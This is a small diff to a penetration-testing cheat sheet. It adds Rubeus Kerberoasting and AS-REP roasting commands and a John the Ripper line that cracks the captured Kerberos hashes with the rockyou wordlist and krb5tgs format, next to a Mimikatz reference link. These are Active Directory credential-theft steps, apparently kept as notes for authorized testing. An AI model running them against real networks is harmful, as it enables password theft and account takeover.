@@ -20,9 +20,14 @@
 
 # Roasting
 
-```Rubeus.exe kerberoast/asreproast```
+```Rubeus.exe kerberoast /nowrap```
+```Rubeus.exe asreproast /nowrap```
 
 ```john hash.txt```
+```john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt```
+
+```--format=krb5tgs```
+
 
 # Mimikatz
 https://adsecurity.org/?page_id=1821
